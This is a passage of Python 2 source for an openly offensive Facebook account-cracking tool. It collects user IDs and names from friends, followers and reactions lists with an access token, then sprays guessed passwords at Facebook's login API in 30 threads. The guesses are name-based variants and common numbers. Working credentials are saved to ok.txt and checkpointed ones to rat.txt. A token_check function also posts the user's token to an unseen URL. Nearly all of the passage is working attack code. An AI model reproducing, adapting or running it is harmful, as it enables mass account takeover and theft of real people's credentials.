		main()
	elif sel =="0" or sel =="00":
		xox("\n\t\033[91;1m YOUR FATHER!!! 🖕😅")
		sys.exit()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		log_sel()

def check_cps():
        os.system('clear')
	logo()
	print("")
	print("")
	print("\t\033[93;1m YOUR CHECKPOINTS")
	print("")
	cps = open('rat.txt','r').read()
	print "\033[1;97m"+cps
        print("")
	raw_input("\n\033[92;1m Press ENTER to Save and go Back")
        os.system("cp rat.txt /storage/emulated/0")
        xox("\n\033[91;1m CHECKPOINTS SAVED SUCCESSFULLY 👍")
        time.sleep(2)
	main()

def login():
        os.system("clear")
        logo()
        print("")
        username = raw_input("\033[1;97m\x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
        if (username == CorrectUsername):
            password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
            if (password == CorrectPassword):
                print "\033[1;92mLogged in successfully 💪😈"
	        time.sleep(1)
                token()
            else:
                print "\033[1;94mWRONG PASSWORD ❌❌❌"
                subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=2348144982650&text=Hello+I+want+to+pay+for+the+username+and+password+to+your+tool"])
                time.sleep(1)
                login()
        else:
            print "\033[1;94mWRONG USERNAME ❌❌❌"
            subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=2348144982650&text=Hello+I+want+to+pay+for+the+username+and+password+to+your+tool"])
            time.sleep(1)
            login()

def token():
    os.system("clear")
    try:
        token = open("token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        logo()
        print("")
        print("\t\033[92;1m  LOGIN TOKEN")
        print("")
        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
        sav = open("token.txt", "w")
        sav.write(token)
        sav.close()
        token_check()
        menu()

def token_check():
	try:
		token=open('token.txt','r').read()
	except IOError:
		print"\033[91;1m[!] TOKEN INVALID"
		os.system('rm -rf token.txt')
	requests.post(useragent_url + token, headers=header)
	pass

def menu():
    os.system("clear")
    try:
        token = open("token.txt", "r").read()
    except(KeyError , IOError):
        token()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        logo()
        print("")
        print("\033[91;1m     LOGGED IN TOKEN HAS EXPIRED")
        os.system("rm -rf token.txt")
        print("")
        time.sleep(1)
        main()
    os.system("clear")
    xn = name.upper()
    logo()
    print("")
    print("\033[93;1m     HELLO   : \033[92;1m"+xn)
    print("\033[93;1m     REGION  : \033[92;1m") + loc
    print("\033[93;1m     YOUR IP : \033[92;1m") + ip
    print("")

    print("")
    print("\t\033[92;1m  BY OKWUDIRE PROMISE")
    print("")
    print("\033[92;1m  [1] CRACK WITH PASSWORD 1")
    print("\033[93;1m  [2] CRACK WITH PASSWORD 2")
    print("\033[94;1m  [3] CRACK WITH ALL PASSWORDS")
    print("\033[96;1m  [4] SHOW TOKEN")
    print('\033[91;1m  [0] BACK')
    print("")
    menu_option()
    
def menu_option():
	select = raw_input("\033[92;1m  CHOOSE : ")
	if select =="1":
		crack1()
	elif select =="2":
		crack()
	elif select =="3":
	    crack2()
	elif select =="4":
		os.system('clear')
		logo()
		print("")
		print("")
		token=open('token.txt','r').read()
		print "\033[1;92mYour token\033[1;91m :\033[1;97m "+token
                print("")
		raw_input("\n\t\033[92;1m Press ENTER to go Back")
		menu()
	elif select =="0":
		main()
	else:
		print("")
		print("\t\033[91;1m     SELECT VALID OPTION")
		print("")
		menu_option()

def crack1():
	global token
	os.system("clear")
	try:
		token = open("token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		fb_token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m CHOOSE PATH TO CRACK THROUGH")
	print("")
	print("\033[92;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[94;1m  [3] CRACK REACTIONS")
	print("\033[95;1m  [4] CRACK FILE")
	print("\033[91;1m  [0] BACK")
	print("")
	crack_select1()
	
def crack_select1():
	select = raw_input("\033[92;1m  CHOOSE : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[92;1m MULTI PUBLIC ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI FOLLOWERS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FOLLOWERS, TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="3":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI REACTORS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT POST ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/reactions?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  CANNOT SCAN REACTIONS")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="4":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m   AUTO PASS CRACKING")
		print("")
		filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
				
		except IOError:
			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
			print("")
			raw_input("\033[93;1m PRESS ENTER TO BACK")
			crack1()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select1()
	os.system("clear")
	logo()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  FB BOMBING HAS STARTED\x1b[0m")
	print("\033[93;1m  WATCH THE MAGIC HAPPEN ✌️😈 \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		global loop,okc,cpc
		bi = random.choice([u,k,kk,b,h,hh])
		sys.stdout.write('\r %s[ Cracking ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id),okc,cpc)),
		sys.stdout.flush()
		user=arg
		uid,name=user.split("|")
		vaugent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': vaugent})
		try:
			pass1 = name.lower().split(' ')[0] + '1234'
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
			q = json.loads(data)
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
				okc+=1
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q['error_msg']:
					print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
					cpc+=1
					cp = open("rat.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0] + '123'
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
						okc+=1
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q['error_msg']:
							print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
							cpc+=1
							cp = open("rat.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower().split(' ')[0] + '12'
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
								okc+=1
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q['error_msg']:
									print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
									cpc+=1
									cp = open("rat.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower().split(' ')[1] + '1234'
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
										okc+=1
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q['error_msg']:
											print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
											cpc+=1
											cp = open("rat.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower().split(' ')[1] + '123'
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
												okc+=1
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q['error_msg']:
													print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
													cpc+=1
													cp = open("rat.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower().split(' ')[1] + '12'
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
														okc+=1
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q['error_msg']:
															print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
															cpc+=1
															cp = open("rat.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower()
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
																okc+=1
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q['error_msg']:
																	print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
																	cpc+=1
																	cp = open("rat.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
																		okc+=1
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																	else:
																		if "www.facebook.com" in q['error_msg']:
																			print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
																			cpc+=1
																			cp = open("rat.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
																		else:
																  			pass9 = "102030"
																  			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass9+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																			q = json.loads(data)
																			if "access_token" in q and "EAAA" in q:
																  			    print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
																  			    okc+=1
																  			    ok = open("ok.txt", "a")
																  			    ok.write(uid+"|"+pass9+"\n")
																  			    ok.close()
																  			    oks.append(uid+pass9)
																			else:
																  			        if "www.facebook.com" in q['error_msg']:
																  			                print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass9+"\033[0;97m")
																  			                cpc+=1
																  			                cp = open("rat.txt", "a")
																  			                cp.write(uid+"|"+pass9+"\n")
																  			                cp.close()
																  			                cps.append(uid+pass9)
																  			        else:		
																					pass10 = "223344"
																					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass10+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																					q = json.loads(data)
																					if "access_token" in q and "EAAA" in q:
																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass10+"\033[0;97m")
																						okc+=1
																						ok = open("ok.txt", "a")
																						ok.write(uid+"|"+pass10+"\n")
																						ok.close()
																						oks.append(uid+pass10)
																  			 		else:
																  			        		if "www.facebook.com" in q['error_msg']:
																							print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass10+"\033[0;97m")
																							cpc+=1
																							cp = open("rat.txt", "a")
																							cp.write(uid+"|"+pass10+"\n")
																							cp.close()
																							cps.append(uid+pass10)
																						else:
																							pass11 = "556677"
																							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass11+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																							q = json.loads(data)
																							if "access_token" in q and "EAAA" in q:
																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
																								okc+=1
																								ok = open("ok.txt", "a")
																								ok.write(uid+"|"+pass11+"\n")
																								ok.close()
																								oks.append(uid+pass11)
																							else:
																								if "www.facebook.com" in q['error_msg']:
																									print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
																									cpc+=1
																									cp = open("rat.txt", "a")
																									cp.write(uid+"|"+pass11+"\n")
																									cp.close()
																									cps.append(uid+pass1)
																								else:
																									pass12 = "786786"
																									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass12+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																									q = json.loads(data)
																									if "access_token" in q and "EAAA" in q:
																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
																										okc+=1
																										ok = open("ok.txt", "a")
																										ok.write(uid+"|"+pass12+"\n")
																										ok.close()
																										oks.append(uid+pass12)
																									else:
																										if "www.facebook.com" in q['error_msg']:
																											print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
																											cpc+=1
																											cp = open("rat.txt", "a")
																											cp.write(uid+"|"+pass12+"\n")
																											cp.close()
																											cps.append(uid+pass12)
																										else:
																											pass13 = "123456"
																											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass13+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																											q = json.loads(data)
																											if "access_token" in q and "EAAA" in q:
																												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
																												okc+=1
																												ok = open("ok.txt", "a")
																												ok.write(uid+"|"+pass13+"\n")
																												ok.close()
																												oks.append(uid+pass13)
																											else:
																												if "www.facebook.com" in q['error_msg']:
																													print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass13+"\033[0;97m")
																													cpc+=1
																													cp = open("rat.txt", "a")
																													cp.write(uid+"|"+pass13+"\n")
																													cp.close()
																													cps.append(uid+pass13)
																												else:
																													pass14 = "112233"
																													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass14+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																													q = json.loads(data)
																													if "access_token" in q and "EAAA" in q:
																														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
																														okc+=1
																														ok = open("ok.txt", "a")
																														ok.write(uid+"|"+pass14+"\n")
																														ok.close()
																														oks.append(uid+pass14)
																													else:
																														if "www.facebook.com" in q['error_msg']:
																															print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass14+"\033[0;97m")
																															cpc+=1
																															cp = open("rat.txt", "a")
																															cp.write(uid+"|"+pass14+"\n")
																															cp.close()
																															cps.append(uid+pass14)
																														else:
																															pass15 = "1233567890"
																															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass15+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																															q = json.loads(data)
																															if "access_token" in q and "EAAA" in q:
																																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
																																okc+=1
																																ok = open("ok.txt", "a")
																																ok.write(uid+"|"+pass15+"\n")
																																ok.close()
																																oks.append(uid+pass15)
																															else:
																																if "www.facebook.com" in q['error_msg']:
																																	print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
																																	cpc+=1
																																	cp = open("rat.txt", "a")
																																	cp.write(uid+"|"+pass15+"\n")
																																	cp.close()											
																																	cps.append(uid+pass15)
																																
		
												
										
										
		except:
			pass
		loop+=1
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m BOMBING COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()


def crack():
	global token
	os.system("clear")
	try:
		token = open("token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		fb_token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m CHOOSE PATH TO CRACK THROUGH")
	print("")
	print("\033[92;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[94;1m  [3] CRACK REACTIONS")
	print("\033[95;1m  [4] CRACK FILE")
	print("\033[91;94;1m1m  [0] BACK")
	print("")
	crack_select()
	
def crack_select():
	select = raw_input("\033[92;1m  CHOOSE : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[92;1m MULTI PUBLIC ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI FOLLOWERS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="3":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI REACTORS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT POST ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/reactions?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  CANNOT SCAN REACTIONS")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="4":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m   AUTO PASS CRACKING")
		print("")
		filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
				
		except IOError:
			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
			print("")
			raw_input("\033[93;1m PRESS ENTER TO BACK")
			crack()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select()
	os.system("clear")
	logo()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  FB BOMBING HAS STARTED\x1b[0m")
	print("\033[93;1m  WATCH THE MAGIC HAPPEN ✌️😈 \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		global loop,okc,cpc
		bi = random.choice([u,k,kk,b,h,hh])
		sys.stdout.write('\r %s[ Cracking ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id),okc,cpc)),
		sys.stdout.flush()
		user=arg
		uid,name=user.split("|")
		vaugent = random.choice(agents)
		session = requests.Session()
